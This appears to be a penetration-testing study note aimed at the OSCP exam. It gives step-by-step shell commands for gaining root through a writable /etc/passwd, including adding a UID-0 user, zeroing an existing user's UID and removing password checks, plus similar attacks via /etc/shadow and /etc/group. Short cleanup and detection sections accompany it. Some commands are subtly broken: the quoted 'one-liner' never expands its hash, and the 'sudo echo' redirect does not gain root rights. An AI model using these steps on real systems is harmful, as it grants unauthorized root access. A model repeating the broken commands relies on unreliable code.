# Writable /etc/passwd Exploitation

tags: #Linux #Privilege_Escalation #Foundational

resources: [HackTricks /etc/passwd](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd)

> [!info] If `/etc/passwd` is writable, you can add a new root user or modify existing users to escalate privileges.

## Understanding /etc/passwd

### File Format

```plaintext
username:password:UID:GID:comment:home:shell
```

### Example Entry

```plaintext
root:x:0:0:root:/root:/bin/bash
```

### Field Breakdown

```plaintext
root        - Username
x           - Password (x means in /etc/shadow)
0           - User ID (0 = root)
0           - Group ID (0 = root group)
root        - Comment/GECOS field
/root       - Home directory
/bin/bash   - Default shell
```

## Checking if /etc/passwd is Writable

```bash
ls -l /etc/passwd
```

```bash
# Check write permissions
ls -l /etc/passwd
# Output: -rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd
#         ^^^ ^^^ ^^^
#         Owner Group Others - All have write permission!
```

```bash
# Test if writable
test -w /etc/passwd && echo "Writable!" || echo "Not writable"
```

## Method 1: Add New Root User

### Step 1: Generate Password Hash

```bash
openssl passwd <password>
```

```bash
# Example
openssl passwd Password123
# Output: $1$xyz$abc123...
```

```bash
# With salt
openssl passwd -1 -salt xyz Password123
# Output: $1$xyz$abc123...
```

### Step 2: Add User to /etc/passwd

```bash
echo 'hacker:$1$xyz$abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

> [!important] UID 0 and GID 0 make this user equivalent to root!

### Step 3: Switch to New User

```bash
su hacker
# Password: Password123
```

```bash
# Verify root access
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)
```

## Method 2: Modify Existing User

### Change User's UID to 0

```bash
# Find your current user in /etc/passwd
grep $USER /etc/passwd

# Change UID and GID to 0
sed -i 's/^<username>:x:[0-9]*:[0-9]*:/<username>:x:0:0:/' /etc/passwd
```

```bash
# Example for user 'john'
sed -i 's/^john:x:[0-9]*:[0-9]*:/john:x:0:0:/' /etc/passwd
```

### Verify Changes

```bash
# Logout and login again
exit
su john

# Check privileges
id
# Output: uid=0(root) gid=0(root)
```

## Method 3: Remove Password Requirement

### Remove Password Hash

```bash
# Change from:
# user:x:1000:1000:...
# To:
# user::1000:1000:...
```

```bash
# Remove password requirement
sed -i 's/^<username>:x:/<username>::/' /etc/passwd
```

```bash
# Now switch to user without password
su <username>
# No password required!
```

## Complete Workflow Example

### Step 1: Check if Writable

```bash
ls -l /etc/passwd
# Output: -rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd
```

### Step 2: Generate Password Hash

```bash
openssl passwd Password123
# Output: $1$xyz$abc123def456ghi789
```

### Step 3: Add Root User

```bash
echo 'hacker:$1$xyz$abc123def456ghi789:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### Step 4: Verify Addition

```bash
tail -1 /etc/passwd
# Output: hacker:$1$xyz$abc123def456ghi789:0:0:root:/root:/bin/bash
```

### Step 5: Switch to New User

```bash
su hacker
# Password: Password123
```

### Step 6: Verify Root Access

```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# Success!
```

## Alternative Password Hash Methods

### Using Python

```python
python3 -c 'import crypt; print(crypt.crypt("Password123", crypt.mksalt(crypt.METHOD_SHA512)))'
```

### Using Perl

```perl
perl -e 'print crypt("Password123", "salt"),"\n"'
```

### Using mkpasswd

```bash
mkpasswd -m sha-512 Password123
```

## Different Hash Types

### DES (Weak, Legacy)

```bash
openssl passwd Password123
# Output: xyz123abc
```

### MD5

```bash
openssl passwd -1 Password123
# Output: $1$salt$hash
```

### SHA-256

```bash
openssl passwd -5 Password123
# Output: $5$salt$hash
```

### SHA-512 (Recommended)

```bash
openssl passwd -6 Password123
# Output: $6$salt$hash
```

## Troubleshooting

### Password Hash Not Working

```bash
# Try different hash method
openssl passwd -1 -salt xyz Password123

# Or use simpler password
openssl passwd -1 password
```

### User Added But Can't Login

```bash
# Check if entry is correct
tail -1 /etc/passwd

# Ensure UID is 0
grep hacker /etc/passwd
# Should show: hacker:...:0:0:...
```

### Permission Denied

```bash
# Ensure file is actually writable
ls -l /etc/passwd

# Try with sudo if available
sudo echo 'hacker:...:0:0:...' >> /etc/passwd
```

### Shell Not Working

```bash
# Ensure shell path is correct
which bash
# Output: /bin/bash

# Use correct path in /etc/passwd entry
echo 'hacker:$1$xyz$abc:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Cleanup

### Remove Added User

```bash
# Remove the line
sed -i '/^hacker:/d' /etc/passwd
```

### Restore Original Permissions

```bash
# If you changed permissions
chmod 644 /etc/passwd
```

## Security Considerations

> [!warning] Writable /etc/passwd is a critical misconfiguration:
> - Allows instant root access
> - Leaves obvious traces
> - Easy to detect in logs
> - Should be reported as critical finding

### Detection

```bash
# Admins can detect by:
# - Checking file permissions
ls -l /etc/passwd

# - Checking for UID 0 users
awk -F: '$3 == 0 {print $1}' /etc/passwd

# - Monitoring file changes
# - Reviewing auth logs
```

## OSCP Exam Tips

> [!tip] In OSCP exam:
> - Check /etc/passwd permissions during enumeration
> - If writable, this is instant root
> - Use simple password (password, Password123)
> - Document the misconfiguration
> - Take screenshot of permissions

### Quick Exam Workflow

```bash
# 1. Check if writable (30 seconds)
ls -l /etc/passwd

# 2. Generate hash (30 seconds)
openssl passwd password

# 3. Add user (30 seconds)
echo 'oscp:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# 4. Switch user (30 seconds)
su oscp
# Password: password

# 5. Get flag (30 seconds)
cat /root/proof.txt

# Total: ~3 minutes to root
```

## Common Scenarios

### Scenario 1: World-Writable /etc/passwd

```bash
# Permissions: -rw-rw-rw-
# Anyone can write
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### Scenario 2: Group-Writable /etc/passwd

```bash
# Permissions: -rw-rw-r--
# If you're in the group, you can write
groups
# Output: user adm cdrom sudo dip plugdev lxd

echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### Scenario 3: Backup File Writable

```bash
# Sometimes /etc/passwd.bak is writable
ls -l /etc/passwd*

# Modify backup and restore
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd.bak
cp /etc/passwd.bak /etc/passwd
```

## Related Techniques

### /etc/shadow Writable

```bash
# If /etc/shadow is writable instead
# Generate hash
openssl passwd -6 Password123

# Add to /etc/shadow
echo 'hacker:$6$salt$hash:18000:0:99999:7:::' >> /etc/shadow

# Add to /etc/passwd (without password)
echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch user
su hacker
```

### /etc/group Writable

```bash
# Add yourself to sudo/wheel group
echo 'sudo:x:27:hacker' >> /etc/group

# Or modify existing line
sed -i 's/^sudo:x:27:/sudo:x:27:hacker,/' /etc/group
```

## Quick Reference

### One-Liner Root User

```bash
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker
```

### Check and Exploit

```bash
# Check
ls -l /etc/passwd

# Generate hash
openssl passwd password

# Add user
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch
su hacker
```

### Cleanup

```bash
# Remove added user
sed -i '/^hacker:/d' /etc/passwd
```

## Summary

> [!important] Writable /etc/passwd = Instant Root
> - Check permissions: `ls -l /etc/passwd`
> - Generate hash: `openssl passwd password`
> - Add user with UID 0: `echo 'user:hash:0:0:...' >> /etc/passwd`
> - Switch user: `su user`
> - Verify: `whoami` should show `root`

> [!tip] This is one of the easiest privilege escalation methods when available!
